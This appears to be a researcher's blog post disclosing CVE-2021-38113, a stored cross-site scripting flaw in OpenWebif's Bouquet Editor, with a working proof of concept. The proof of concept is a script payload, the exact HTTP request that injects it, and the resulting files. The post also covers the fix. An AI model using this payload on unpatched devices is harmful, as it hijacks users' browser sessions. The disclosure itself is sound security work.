---
layout: post
title: "CVE-2021-38113"
date: 2021-08-20 15:26:00
categories: research
tags: [research]
pin: true
---

Welcome to my first official blog post, this is just a small writeup regarding my recent finding within Openwebif.

To provide some context, OpenWebif is an open source web interface for Enigma2 based set-top boxes. Enigma 2 is an opensource Linux operating system that has an intuative GUI (graphical user interface), many useful features such as Autotimers, Autobouquets (channel / favourites lists), 7 Days EPG, Picons (channel icons), many 3rd party plugins. Enigma 2 images are provided free of charge by many 3rd party developement teams. OpenViX, OpenATV, OpenPLi, Blackhole and Egami are just a few of them. Different teams support different receivers, not all teams provide image / firmware support for all makes models, this vary's from team to team. [Reference](https://www.world-of-satellite.co.uk/faq-frequently-asked-questions-enigma2-openvix)

## Vuln/PoC

A specific payload can make it so that everytime the user opens the Openwebif interface, it will redirect them to whatever page you like, no matter what page they go to it will redirect them.

When adding Javascript code into the `Add Bouquet` function within the Bouquet Editor, it stores it within the `/etc/enigma2` directory on the Enigma2 device here:

```
$ cat /etc/enigma2/userbouquet._script_alert_document_domain__window_location_replace__https___github_com_kozmer_____script___tv_.tv

#NAME <script>alert(document.domain);window.location.replace("https://github.com/kozmer");</script> (TV)


$ cat /etc/enigma2/bouquets.tv

#NAME Bouquets (TV)
#SERVICE 1:7:1:0:0:0:0:0:0:0:FROM BOUQUET "userbouquet.favourites.tv" ORDER BY bouquet
#SERVICE 1:7:1:0:0:0:0:0:0:0:FROM BOUQUET "userbouquet._script_alert_document_domain__window_location_replace__https___github_com_kozmer_____script___tv_.tv" ORDER BY bouquet
```

Here is the request:

```
GET /bouqueteditor/api/addbouquet?name=%3Cscript%3Ewindow.location.replace(%22https%3A%2F%2Fgithub.com%2Fkozmer%22)%3B%3C%2Fscript%3E&mode=0&_=1628087265204 HTTP/1.1
Host: 192.168.0.22
User-Agent: Mozilla/5.0 (Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Referer: http://192.168.0.22/
Cookie: TWISTED_SESSION=<removed>
Sec-GPC: 1


HTTP/1.1 200 OK
Date: Wed, 04 Aug 2021 13:28:22 GMT
Connection: close
Content-Type: text/plain
Server: TwistedWeb/16.4.0
Content-Length: 116

{"Result": [true, "Bouquet <script>window.location.replace(\"https://github.com/kozmer\");</script> (TV) created."]}
```

Here is a Video PoC
![PoC](../../assets/img/CVE-2021-38113.gif)

## Fix
The reason this was happening is because the input wasn't being sanitized/stripped of chars such as `<` & `>`. This issue has now been fixed with this [Commit](https://github.com/E2OpenPlugins/e2openplugin-OpenWebif/commit/4d2c8ad3ed33953407e7cf037f900dfe75d56501)

I have to give props to the team over at Openwebif/E2OpenPlugins for getting this sorted very quickly.
